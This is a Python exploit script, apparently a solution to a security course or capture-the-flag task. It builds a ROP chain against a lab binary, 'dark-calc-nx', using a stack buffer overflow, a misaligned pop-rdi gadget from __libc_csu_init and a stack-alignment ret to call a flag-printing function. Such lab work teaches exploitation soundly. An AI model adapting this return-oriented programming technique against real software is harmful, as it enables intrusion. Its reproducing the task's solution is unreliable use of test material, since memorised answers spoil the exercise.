#!/usr/bin/env python3
"""Task 3: ROP chain for attack/dark-calc-nx (NX stack, ASLR, no wrapper).

dark-calc-nx has no __wrap_main / init_fixed_stack, so this time the stack is
neither executable nor at a predictable address.  Everything the exploit needs
must therefore come from the non-PIE .text section, whose addresses are fixed.

The handout points at 0x4019d0..0x401ae3, i.e. __libc_csu_init:

    4019d0 <__libc_csu_init>:
      ...
    401a26: add  $0x8,%rsp
    401a2a: pop  %rbx
    401a2b: pop  %rbp
    401a2c: pop  %r12
    401a2e: pop  %r13
    401a30: pop  %r14
    401a32: pop  %r15        ; 41 5f
    401a34: ret              ; c3

Entering one byte late at 0x401a33 gives `pop %rdi; ret` (5f c3) - a gadget
that sets the first argument, which is otherwise hard to construct without a
`pop rdi` in this small binary.  The same epilogue also yields a bare `ret` at
0x401a34, used to repair the 16-byte stack alignment before calling
grade_eval(): at grade_eval's entry rsp must be ≡ 8 (mod 16), otherwise the
`movaps` inside printf faults.

Chain (after input()'s `leave; ret`, rsp = rbp+16, which is 16-aligned):

    rbp+8   : 0x401a33  pop %rdi; ret
    rbp+16  : 4         -> edi
    rbp+24  : 0x401a34  ret            (alignment fixer)
    rbp+32  : 0x401978  grade_eval(4)  -> prints the flag
    rbp+40  : 0x4016e0  exit@plt
"""
import sys

POP_RDI_RET = 0x401A33      # 5f c3, one byte inside __libc_csu_init's epilogue
RET         = 0x401A34      # c3
GRADE_EVAL  = 0x401978
EXIT_PLT    = 0x4016E0

def q(x):
    return x.to_bytes(8, "little")

payload  = b"A" * 16        # char expression[16] at rbp-0x10
payload += b"B" * 8         # saved rbp
payload += q(POP_RDI_RET)   # input's `ret` lands here
payload += q(4)             # -> edi = 4
payload += q(RET)           # re-align rsp to ≡ 8 (mod 16)
payload += q(GRADE_EVAL)    # grade_eval(4)
payload += q(EXIT_PLT)      # exit(...) so we do not crash after printing

assert b"\n" not in payload
sys.stdout.buffer.write(payload)
